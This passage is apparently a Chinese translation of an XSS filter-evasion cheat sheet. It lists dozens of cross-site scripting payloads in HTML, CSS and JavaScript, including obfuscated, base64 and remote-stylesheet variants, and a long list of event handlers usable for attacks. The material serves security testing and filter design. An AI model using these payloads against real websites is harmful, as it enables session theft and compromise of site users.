&lt;p&gt;使用一个左尖括号替代右尖括号作为标签结尾的攻击向量会在不同浏览器的Gecko渲染引擎下有不同表现。没有左尖括号时，在Firefox中生效，而在Netscape中无效。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;iframe src=http://xss.rocks/scriptlet.html &amp;lt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;javascript双重转义&quot;&gt;JavaScript双重转义&lt;/h2&gt;

&lt;p&gt;当应用将一些用户输入输出到例如：&lt;script&gt;var  a=&quot;$ENV{QUERY_STRING}&quot;;&lt;/script&gt;的JavaScript中时，你想注入你的JavaScript脚本，你可以通过转义转义字符来规避服务器端转义引号。注入后会得到&lt;script&gt;vara=&quot;\\&quot;;alert('XSS');//&quot;;&lt;/script&gt;，这时双引号不会被转义并且可以触发跨站脚本攻击向量。XSS定位器就用了这种方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;\&quot;;alert('XSS');//
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;另一种情况是，如果内嵌数据进行了正确的JSON或JavaScript转义，但没有HTML编码，那可以结束原有脚本块并开始你自己的：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert('XSS');&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;闭合title标签&quot;&gt;闭合title标签&lt;/h2&gt;

&lt;p&gt;这是一个简单的闭合&lt;TITLE&gt;标签的XSS攻击向量，可以包含恶意的跨站脚本攻击&lt;/TITLE&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;/TITLE&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&quot;XSS&quot;);&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;input-image&quot;&gt;INPUT image&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;body-image&quot;&gt;BODY image&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BODY BACKGROUND=&quot;javascript:alert('XSS')&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;img-dynsrc&quot;&gt;IMG Dynsrc&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG DYNSRC=&quot;javascript:alert('XSS')&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;img-lowsrc&quot;&gt;IMG lowsrc&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG LOWSRC=&quot;javascript:alert('XSS')&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;list-style-image&quot;&gt;List-style-image&lt;/h2&gt;

&lt;p&gt;处理嵌入的图片列表是很麻烦的问题。由于JavaScript指令的原因只能在IE渲染引擎下有效。不是一个特别有用的跨站脚本攻击向量:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}&amp;lt;/STYLE&amp;gt;&amp;lt;UL&amp;gt;&amp;lt;LI&amp;gt;XSS&amp;lt;/br&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;图片中引用vbscript&quot;&gt;图片中引用VBscript&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC='vbscript:msgbox(&quot;XSS&quot;)'&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;livescript-仅限旧版本netscape&quot;&gt;Livescript (仅限旧版本Netscape)&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;livescript:[code]&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;svg对象标签&quot;&gt;SVG对象标签&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;svg/onload=alert('XSS')&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;ecmascript-6&quot;&gt;ECMAScript 6&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;Set.constructor`alert\x28document.domain\x29``` 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;body标签&quot;&gt;BODY标签&lt;/h2&gt;

&lt;p&gt;这个方法不需要使用任何例如”javascript:”或”&amp;lt;SCRIPT…“语句来完成XSS攻击。Dan Crowley特别提醒你可以在等号前加入一个空格(“onload=” != “onload =”):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BODY ONLOAD=alert('XSS')&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;事件处理程序&quot;&gt;事件处理程序&lt;/h2&gt;

&lt;p&gt;在XSS攻击中可使用以下事件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;

    1.    FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件)

    2.    onAbort() (当用户中止加载图片时)

    3.    onActivate() (当对象激活时)

    4.    onAfterPrint() (用户打印或进行打印预览后触发)

    5.    onAfterUpdate() (从数据源对象更新数据后由数据对象触发)

    6.    onBeforeActivate() (在对象设置为激活元素前触发)

    7.    onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过执行execCommand(&quot;Copy&quot;)函数触发)

    8.    onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码)

    9.    onBeforeDeactivate() (在当前对象的激活元素变化前触发)

    10.  onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的对象被选中时触发)

    11.  onBeforePaste() (在用户被诱导进行粘贴前或使用execCommand(&quot;Paste&quot;)函数触发)

    12.  onBeforePrint() (用户需要被诱导进行打印或攻击者可以使用print()或execCommand(&quot;Print&quot;)函数).

    13.  onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能关闭当前窗口)

    14.  onBeforeUpdate() (从数据源对象更新数据前由数据对象触发)

    15.  onBegin() (当元素周期开始时由onbegin 事件立即触发)

    16.  onBlur() (另一个窗口弹出当前窗口失去焦点时触发)

    17.  onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内容到达窗口一边时触发)

    18.  onCellChange() (当数据提供者的数据变化时触发)

    19.  onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发)

    20.  onClick() (表单中点击触发)

    21.  onContextMenu() (用户需要在攻击区域点击右键)

    22.  onControlSelect() (当用户在一个对象上创建控件选中区时触发)

    23.  onCopy() (用户需要复制一些东西或使用execCommand(&quot;Copy&quot;)命令时触发)

    24.  onCut() (用户需要剪切一些东西或使用execCommand(&quot;Cut&quot;)命令时触发)

    25.  onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能)

    26.  onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发)

    27.  onDataSetComplete() (数据源对象中所有数据可用时触发)

    28.  onDblClick() (用户双击一个表单元素或链接)

    29.  onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发)

    30.  onDrag() (在元素正在拖动时触发)

    31.  onDragEnd() (当用户完成元素的拖动时触发)

    32.  onDragLeave() (用户在拖动元素离开放置目标时触发)

    33.  onDragEnter() (用户将对象拖拽到合法拖曳目标)

    34.  onDragOver() (用户将对象拖拽划过合法拖曳目标)

    35.  onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口)

    36.  onDragStart() (当用户开始拖动元素时触发)

    37.  onDrop() (当拖动元素放置在目标区域时触发)

    38.  onEnded() (在视频/音频（audio/video）播放结束时触发)

    39.  onError() (在加载文档或图像时发生错误)

    40.  onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发)

    41.  onFilterChange() (当滤镜完成状态变更时触发)

    42.  onFinish() (当marquee完成滚动时攻击者可以执行攻击)

    43.  onFocus() (当窗口获得焦点时攻击者可以执行攻击代码)

    44.  onFocusIn() (当元素将要被设置为焦点之前触发)

    45.  onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码)

    46.  onHashChange() (当锚部分发生变化时触发攻击代码)

    47.  onHelp() (攻击者可以在用户在当前窗体激活时按下F1触发攻击代码)

    48.  onInput() (在 &amp;lt;input&amp;gt; 或 &amp;lt;textarea&amp;gt; 元素的值发生改变时触发)

    49.  onKeyDown() (用户按下一个键的时候触发)

    50.  onKeyPress() (在键盘按键被按下并释放一个键时触发)

    51.  onKeyUp() (用户释放一个键时触发)

    52.  onLayoutComplete() (用户进行完打印或打印预览时触发)

    53.  onLoad() (攻击者在窗口加载后触发攻击代码)

    54.  onLoseCapture() (可以由releaseCapture()方法触发)

    55.  onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发)

    56.  onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发事件)

    57.  onMessage() (当页面收到一个信息时触发事件)

    58.  onMouseDown() (攻击者需要让用户点击一个图片触发事件)

    59.  onMouseEnter() (光标移动到一个对象或区域时触发)

    60.  onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)

    61.  onMouseMove() (攻击者需要让用户将光标移到一个图片或表格)

    62.  onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)

    63.  onMouseOver() (光标移动到一个对象或区域)

    64.  onMouseUp() (攻击者需要让用户点击一个图片)

    65.  onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮)

    66.  onMove() (用户或攻击者移动页面时触发)

    67.  onMoveEnd() (用户或攻击者移动页面结束时触发)

    68.  onMoveStart() (用户或攻击者开始移动页面时触发)

    69.  onOffline() (当浏览器从在线模式切换到离线模式时触发)

    70.  onOnline() (当浏览器从离线模式切换到在线模式时触发)

    71.  onOutOfSync() (当元素与当前时间线失去同步时触发)

    72.  onPaste() (用户进行粘贴时或攻击者可以使用execCommand(&quot;Paste&quot;)函数时触发)

    73.  onPause() (在视频或音频暂停时触发)

    74.  onPopState() (在窗口的浏览历史（history 对象）发生改变时触发)

    75.  onProgress() (攻击者可以在一个FLASH加载时触发事件)

    76.  onPropertyChange() (用户或攻击者需要改变元素属性时触发)

    77.  onReadyStateChange() (每次 readyState 属性变化时被自动调用)

    78.  onRedo() (用户返回上一页面时触发)

    79.  onRepeat() (事件在播放完重复播放时触发)

    80.  onReset() (用户或攻击者重置表单时触发)

    81.  onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发:&amp;lt;SCRIPT&amp;gt;self.resizeTo(500,400);&amp;lt;/SCRIPT&amp;gt;)

    82.  onResizeEnd() (用户完成改变窗体大小时触发)

    83.  onResizeStart() (用户开始改变窗体大小时触发)

    84.  onResume() (当元素继续播放时触发)

    85.  onReverse() (当元素回放时触发)

    86.  onRowsEnter() (用户或攻击者需要改变数据源中的一行)

    87.  onRowExit() (用户或攻击者改变数据源中的一行后退出时触发)

    88.  onRowDelete() (用户或攻击者需要删除数据源中的一行)

    89.  onRowInserted() (user or attacker would needto insert a row in a data source)

    90.  onScroll() (用户需要滚动或攻击者使用scrollBy()函数)

    91.  onSeek() (当用户在元素上执行查找操作时触发)

    92.  onSelect() (用户需要选择一些文本-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)

    93.  onSelectionChange() (当用户选择文本变化时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)

    94.  onSelectStart() (当用户开始选择文本时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)

    95.  onStart() (在marquee 对象开始循环时触发)

    96.  onStop() (当用户按下停止按钮或离开页面时触发)

    97.  onStorage() (当Web Storage更新时触发)

    98.  onSyncRestored() (当元素与它的时间线恢复同步时触发)

    99.  onSubmit() (需要用户或攻击者提交表单)

    100.onTimeError() (用户或攻击者设置时间属性出现错误时触发)

    101.onTrackChange() (用户或攻击者改变播放列表内歌曲时触发)

    102.onUndo() (用户返回上一浏览记录页面时触发)

    103.onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发)

    104.onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个HTML+TIME（基于时间交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本)

    105.seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可以从该点播放。这个段落包含了一个重复的时间线，并包括使用AUTOREVERSE属性进行反向播放。)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;bgsound&quot;&gt;BGSOUND&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BGSOUND SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;-javascript包含&quot;&gt;&amp;amp; JavaScript包含&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BR SIZE=&quot;&amp;amp;{alert('XSS')}&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;样式表&quot;&gt;样式表&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert('XSS');&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;远程样式表&quot;&gt;远程样式表&lt;/h2&gt;

&lt;p&gt;利用像远程样式表一样简单的形式，你可以将XSS攻击代码包含在可使用内置表达式进行重定义的样式参数里。)这只在IE和使用IE渲染模式Netscape8.1+。注意这里没有任何元素在页面中表明这页面包含了JavaScript。提示：这些远程样式表都使用了body标签,所以必须在页面中有除了攻击向量以外的内容存在时才会生效, 也就是如果是空白页的话你必须在页面添加一个字母来让攻击代码生效:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://xss.rocks/xss.css&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;远程样式表2&quot;&gt;远程样式表2&lt;/h2&gt;

&lt;p&gt;这个和上面一样有效，不过使用了&lt;style&gt;标签替代&lt;link /&gt;标签.  这个细微的变化曾经用来攻击谷歌桌面。另一方面，如果在攻击向量后有HTML标签闭合攻击向量，你可以移除末尾的&lt;/style&gt;标签。在进行跨站脚本攻击时，如不能同时使用等号或斜杠，这是非常有用的，这种情况在现实世界里不止一次发生了:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;@import'http://xss.rocks/xss.css';&amp;lt;/STYLE&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;远程样式表3&quot;&gt;远程样式表3&lt;/h2&gt;

&lt;p&gt;这种方式仅在Opera 8.0(9.x不可以)中有效，但方法比较有创意.  根据RFC2616，设置一个Link头部不是HTTP1.1规范的一部分,但一些浏览器仍然允许这样做 (例如Firefox和  Opera).  这里的技巧是设置一个头部（和普通头部并没有什么区别，只是设置Link: &lt;a href=&quot;http://xss.rocks/xss.css&quot;&gt;http://xss.rocks/xss.css&lt;/a&gt;; REL=stylesheet）并且在远程样式表中包含使用了JavaScript的跨站脚本攻击向量，这一点是FireFox不支持的:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&amp;lt;http://xss.rocks/xss.css&amp;gt;; REL=stylesheet&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;远程样式表4&quot;&gt;远程样式表4&lt;/h2&gt;

&lt;p&gt;这仅能在Gecko渲染引擎下有效并且需要在父页面绑定一个XML文件。具有讽刺意味的是 Netscape认为Gecko更安全 ，所以对绝大多数网站来说会受到漏洞影响:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;BODY{-moz-binding:url(&quot;http://xss.rocks/xssmoz.xml#xss&quot;)}&amp;lt;/STYLE&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;含有分隔javascript的style标签&quot;&gt;含有分隔JavaScript的STYLE标签&lt;/h2&gt;

&lt;p&gt;这个XSS会在IE中造成无限循环:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;@im\port'\ja\vasc\ript:alert(&quot;XSS&quot;)';&amp;lt;/STYLE&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;style属性中使用注释分隔表达式&quot;&gt;STYLE属性中使用注释分隔表达式&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert('XSS'))&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;含表达式的img-style&quot;&gt;含表达式的IMG STYLE&lt;/h2&gt;

&lt;p&gt;这是一个将上面XSS攻击向量混合的方法，但确实展示了STYLE标签可以用相当复杂的方式分隔，和上面一样，也会让IE进入死循环:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;exp/*&amp;lt;A STYLE='no\xss:noxss(&quot;*//*&quot;);

xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))'&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;style标签仅旧版本netscape可用&quot;&gt;STYLE标签（仅旧版本Netscape可用）&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE TYPE=&quot;text/javascript&quot;&amp;gt;alert('XSS');&amp;lt;/STYLE&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用背景图像的style标签&quot;&gt;使用背景图像的STYLE标签&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;.XSS{background-image:url(&quot;javascript:alert('XSS')&quot;);}&amp;lt;/STYLE&amp;gt;&amp;lt;A CLASS=XSS&amp;gt;&amp;lt;/A&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用背景的style标签&quot;&gt;使用背景的STYLE标签&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE type=&quot;text/css&quot;&amp;gt;BODY{background:url(&quot;javascript:alert('XSS')&quot;)}&amp;lt;/STYLE&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;含style属性的html任意标签&quot;&gt;含STYLE属性的HTML任意标签&lt;/h2&gt;

&lt;p&gt;IE6.0和IE渲染引擎模式下的Netscape 8.1+并不关心你建立的HTML标签是否存在，只要是由尖括号和字母开始的即可:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;本地htc文件&quot;&gt;本地htc文件&lt;/h2&gt;

&lt;p&gt;这和上面两个跨站脚本攻击向量有些不同，因为它使用了一个必须和XSS攻击向量在相同服务器上的.htc文件。这个示例文件通过下载JavaScript并将其作为style属性的一部分运行来进行攻击&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&amp;gt;     
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;us-ascii编码&quot;&gt;US-ASCII编码&lt;/h2&gt;

&lt;p&gt;US-ASCII编码（由Kurt  Huwig发现）。它使用了畸形的7位ASCII编码来代替8位。这个XSS攻击向量可以绕过大多数内容过滤器，但是只在主机使用US-ASCII编码传输数据时有效，或者可以自己设置编码格式。相对绕过服务器端过滤，这在绕过WAF跨站脚本过滤时候更有效。Apache Tomcat是目前唯一已知使用US-ASCII编码传输的：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;¼script¾alert(¢XSS¢)¼/script¾ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;meta&quot;&gt;META&lt;/h2&gt;

&lt;p&gt;关于meta刷新比较奇怪的是它并不会在头部中发送一个referrer-所以它通常用于不需要referrer的时候:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert('XSS');&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用数据的meta&quot;&gt;&lt;strong&gt;使用数据的META&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;URL  scheme指令。这个非常有用因为它并不包含任何可见的SCRIPT单词或JavaScript指令,因为它使用了base64编码.请查看RFC  2397寻找更多细节。你同样可以使用具有Base64编码功能的XSS工具来编码HTML或JavaScript:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html 
base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;含有额外url参数的meta&quot;&gt;&lt;strong&gt;含有额外URL参数的META&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;如果目标站点尝试检查URL是否包含”http://”，你可以用以下技术规避它(由Moritz Naumann提交):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert('XSS');&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;iframe&quot;&gt;IFRAME&lt;/h2&gt;

&lt;p&gt;如果允许Iframe那就会有很多XSS问题:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IFRAME SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;基于事件iframe&quot;&gt;基于事件IFRAME&lt;/h2&gt;

&lt;p&gt;Iframes和大多数其他元素可以使用下列事件（由David Cross提交）:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;frame&quot;&gt;FRAME&lt;/h2&gt;

&lt;p&gt;Frames和iframe一样有很多XSS问题:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;FRAMESET&amp;gt;&amp;lt;FRAME SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;&amp;lt;/FRAMESET&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;table&quot;&gt;TABLE&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;TABLE BACKGROUND=&quot;javascript:alert('XSS')&quot;&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;td&quot;&gt;&lt;strong&gt;TD&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;和上面一样，TD也可以通过BACKGROUND来包含JavaScriptXSS攻击向量:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;TABLE&amp;gt;&amp;lt;TD BACKGROUND=&quot;javascript:alert('XSS')&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;div&quot;&gt;DIV&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;DIV STYLE=&quot;background-image: url(javascript:alert('XSS'))&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;含有unicode-xss利用代码的div背景图像&quot;&gt;&lt;strong&gt;含有Unicode XSS利用代码的DIV背景图像&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;这进行了一些修改来混淆URL参数。原始的漏洞是由RenaudLifchitz在Hotmail发现的:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;含有额外字符的div背景图像&quot;&gt;&lt;strong&gt;含有额外字符的DIV背景图像&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Rnaske进行了一个快速的XSS模糊测试来发现IE和安全模式下的Netscape  8.1中任何可以在左括号和JavaScript指令间加入的额外字符。这都是十进制的但是你也可以使用十六进制来填充（以下字符可用：1-32,  34, 39, 160, 8192-8.13, 12288, 65279）:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;DIV STYLE=&quot;background-image: url(&amp;amp;#1;javascript:alert('XSS'))&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;div表达式&quot;&gt;&lt;strong&gt;DIV表达式&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;一个非常有效的对抗现实中的跨站脚本过滤器的变体是在冒号和”expression”之间添加一个换行：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;DIV STYLE=&quot;width: expression(alert('XSS'));&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;html-条件选择注释块&quot;&gt;html 条件选择注释块&lt;/h2&gt;

&lt;p&gt;只能在IE5.0及更高版本和IE渲染引擎模式下的Netscape  8.1生效。一些网站认为在注释中的任何内容都是安全的并且认为没有必要移除，这就允许我们添加跨站脚本攻击向量。系统会在一些内容周围尝试添加注释标签以便安全的渲染它们。如我们所见，这有时并不起作用：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;!--[if gte IE 4]&amp;gt;
&amp;lt;SCRIPT&amp;gt;alert('XSS');&amp;lt;/SCRIPT&amp;gt;
&amp;lt;![endif]--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;base标签&quot;&gt;BASE标签&lt;/h2&gt;

&lt;p&gt;在IE和安全模式下的Netscape  8.1有效。你需要使用//来注释下个字符，这样你就不会造成JavaScript错误并且你的XSS标签可以被渲染。同样，这需要当前网站使用相对路径例如”images/image.jpg”来放置图像而不是绝对路径。如果路径以一个斜杠开头例如”/images/image.jpg”你可以从攻击向量中移除一个斜杠（只有在两个斜杠时注释才会生效）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BASE HREF=&quot;javascript:alert('XSS');//&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;object标签&quot;&gt;OBJECT标签&lt;/h2&gt;

&lt;p&gt;如果允许使用OBJECT，你可以插入一个病毒攻击载荷来感染用户，类似于APPLET标签。链接文件实际是含有你XSS攻击代码的HTML文件:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://xss.rocks/scriptlet.html&quot;&amp;gt;&amp;lt;/OBJECT&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用embed标签加载含有xss的flash文件&quot;&gt;使用EMBED标签加载含有XSS的FLASH文件&lt;/h2&gt;

&lt;p&gt;如果你添加了属性allowScriptAccess=”never”以及allownetworking=”internal”则可以减小风险（感谢Jonathan Vanasco提供的信息）:&lt;/p&gt;

